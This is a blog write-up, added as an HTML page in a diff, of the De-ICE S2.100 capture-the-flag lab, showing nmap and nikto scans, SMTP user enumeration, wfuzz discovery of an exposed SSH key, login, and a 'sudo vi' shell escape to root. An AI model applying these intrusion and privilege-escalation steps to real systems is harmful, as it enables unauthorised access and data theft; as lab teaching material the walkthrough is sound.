@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>De-ICE S2.100 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2013-01-19">January 19, 2013</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/de-ice">de-ice</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">De-ICE S2.100</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This is how I solved the De-ICE S2.100 challenge.  The goal is to obtain salary information for the team of employees.</p>
+
+<h2 id="netdiscover:ba134c7f85bed935eb6493dd99cdb880">Netdiscover</h2>
+
+<p>As usual I ran netdiscover on the subnet range, and straight away something jumped out.</p>
+
+<p>This VM was hosting two Apache services on different IPs.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/2.100# netdiscover -r 192.168.2.0/24 -i eth2
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
+_____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                  
+-----------------------------------------------------------------------------
+192.168.2.100   08:00:27:f6:e8:1d    01    060   CADMUS COMPUTER SYSTEMS
+192.168.2.101   08:00:27:f6:e8:1d    01    060   CADMUS COMPUTER SYSTEMS
+</code></pre>
+
+<h2 id="nmap:ba134c7f85bed935eb6493dd99cdb880">Nmap</h2>
+
+<p>I then scanned the two IPs with nmap.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/2.100# nmap -n -sV -A -p- 192.168.2.100; nmap -n -sV -A -p- 192.168.2.101
+
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      vsftpd 2.0.4
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: Can't parse PASV response: &quot;EOF&quot;
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+|_sshv1: Server supports SSHv1
+25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+| smtp-commands: slax.example.net Hello [192.168.2.200], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP,
+|_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &quot;HELP &lt;topic&gt;&quot;. 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp open   pop3     Openwall popa3d
+143/tcp open   imap     UW imapd 2004.357
+|_imap-capabilities: CAPABILITY SCAN LOGIN-REFERRALS MAILBOX-REFERRALS MULTIAPPEND SORT UNSELECT NAMESPACE STARTTLS LITERAL+ IDLE THREAD=REFERENCES THREAD=ORDEREDSUBJECT OK IMAP4REV1 SASL-IR AUTH=LOGINA0001 completed BINARY
+443/tcp closed https
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Site doesn't have a title (text/html).
+</code></pre>
+
+<p>The Apache service on .100 contained a page containing a long list of users, and as before I took these to form a potential list of users.  This list was quite a lot longer than in previous challenges, so the time it would take to bruteforce SSH logins would be longer than I was willing to spend.</p>
+
+<h2 id="smtp:ba134c7f85bed935eb6493dd99cdb880">SMTP</h2>
+
+<p>I decided to try and validate usernames via the SMTP service.  After experimenting with different the methods, I had a valid list of users.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/2.100# smtp-user-enum -M RCPT -f root @ slax.example.net -U users -t 192.168.2.100
+192.168.2.100: havisham exists
+192.168.2.100: magwitch exists
+192.168.2.100: pirrip exists
+</code></pre>
+
+<h2 id="nikto:ba134c7f85bed935eb6493dd99cdb880">Nikto</h2>
+
+<p>I continued to enumerate the other services, but nothing popped until I ran <code>nikto</code> against the Apache service on .101 (I can imagine that send quite a few people crazy).</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/2.100# nikto -h 192.168.2.101 -Display 124
++ OSVDB-637: /~root/: Allowed to browse root's home directory.
+</code></pre>
+
+<p>It seemed that the root user&rsquo;s home directory was accessible through Apache, although it appeared empty.</p>
+
+<h2 id="wfuzz:ba134c7f85bed935eb6493dd99cdb880">Wfuzz</h2>
+
+<p>Wfuzz is a web crawler and fuzzing tool.  With my list of valid users, I was able to locate their home directories also, but they also appeared empty.  I used <code>wfuzz</code> to try and find hidden directories that are likely to appear in users&rsquo; home directories (<code>.bashrc</code>, <code>.bash_history</code> etc).</p>
+
+<p>I got a hit for a .ssh directory in pirrip&rsquo;s directory - within which were <code>id_rsa</code> files.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/2.100# wfuzz -c -z file,users --hc 404 http://192.168.2.101/~FUZZ/
+00001:  C=200     11 L           46 W         570 Ch       &quot; - havisham&quot;
+00002:  C=200     11 L           46 W         570 Ch       &quot; - magwitch&quot;
+00003:  C=200     11 L           46 W         566 Ch       &quot; - pirrip&quot;
+
+root@kali:~/de-ice/2.100# wfuzz -c -zfile,users --hc 404 http://192.168.2.101/~FUZZ/.ssh
+00003:  C=301      9 L           29 W         329 Ch       &quot; - pirrip&quot;
+</code></pre>
+
+<h2 id="ssh:ba134c7f85bed935eb6493dd99cdb880">SSH</h2>
+
+<p>I downloaded the id_rsa key and was able to SSH in, as pirrip.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/2.100# chmod 400 id_rsa
+root@kali:~/de-ice/2.100# ssh -i id_rsa pirrip @ 192.168.2.100
+Linux 2.6.16.
+pirrip@slax:~$
+</code></pre>
+
+<p>Reviewing the passwd and group files showed that pirrip was part of the wheel group, but I was unable to use sudo as I didn&rsquo;t know pirrip&rsquo;s password.
+I began looking through the filesystem and eventually came across <code>/var/spool/mail/pirrip</code>.  Within here was an email password reminder for pirrip, I tried this password with sudo and it worked.</p>
+
+<pre><code class="language-text">pirrip@slax:~$ more /var/spool/mail/pirrip 
+E-Mail: pirrip @ slax.example.net
+Password: 0l1v3rTw1st
+
+pirrip@slax:~$ sudo -l
+User pirrip may run the following commands on this host:
+    (root) /usr/bin/more
+    (root) /usr/bin/tail
+    (root) /usr/bin/vi
+    (root) /usr/bin/cat ALL
+</code></pre>
+
+<h2 id="sudo:ba134c7f85bed935eb6493dd99cdb880">Sudo</h2>
+
+<p>I could now obtain a list of sudo rights for pirrip.  I could&rsquo;ve used this to obtain the shadow file, to try and crack the root password.  However, an easier route to get a root shell, is through the vi text editor.</p>
+
+<pre><code class="language-text">pirrip@slax:~$ sudo vi
+:!/bin/bash
+bash-3.1# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+</code></pre>
+
+<h2 id="flag:ba134c7f85bed935eb6493dd99cdb880">Flag</h2>
+
+<p>I then found <code>great_expectations.zip</code> within <code>/root/.save/</code>.  Trying to extract this directly on the server resulted in error messages about limited disk space.  So I transfered the file to my Kali machine using netcat.</p>
+
+<p>No passwords were required to decompress, granting me access to <code>Jan08</code>.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/2.100# unzip great_expectations.zip 
+root@kali:~/de-ice/2.100# tar -xvf great_expectations.tar 
+root@kali:~/de-ice/2.100# cat Jan08 
+ 
+Philip Pirrip:  734-67-0424 5.5% $74,224
+Abel Magwitch:  816-03-0028 4.0% $53,122
+Estella Havisham: 762-93-1073 12% $84,325
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2013  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
